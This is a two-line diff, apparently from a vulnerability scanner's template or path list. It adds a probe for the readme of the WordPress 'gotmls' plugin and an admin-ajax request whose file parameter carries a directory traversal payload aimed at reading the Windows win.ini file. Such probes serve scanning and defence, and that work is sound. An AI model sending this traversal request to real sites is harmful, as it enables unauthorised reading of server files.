@@ -1,0 +1,2 @@
+/wp-content/plugins/gotmls/readme.txt
+/wp-admin/admin-ajax.php?action={{randstr}}&file=../../../../../../../../../Windows/win.ini
